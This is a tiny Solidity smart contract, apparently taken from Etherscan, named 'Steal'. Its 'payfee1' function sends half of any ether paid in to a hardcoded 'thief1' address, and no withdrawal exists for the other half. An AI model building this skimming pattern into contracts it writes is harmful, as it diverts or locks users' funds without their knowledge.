/**
 *Submitted for verification at Etherscan.io on 2022-05-21
*/

pragma solidity 0.4.23;

contract Steal 
{
    address thief1 = 0xbb62a8D67495AFEB8c3baa1Ae02B2EeB62D85E65;


    function payfee1 () payable 
    {
        thief1.transfer(msg.value/2);
    }

 }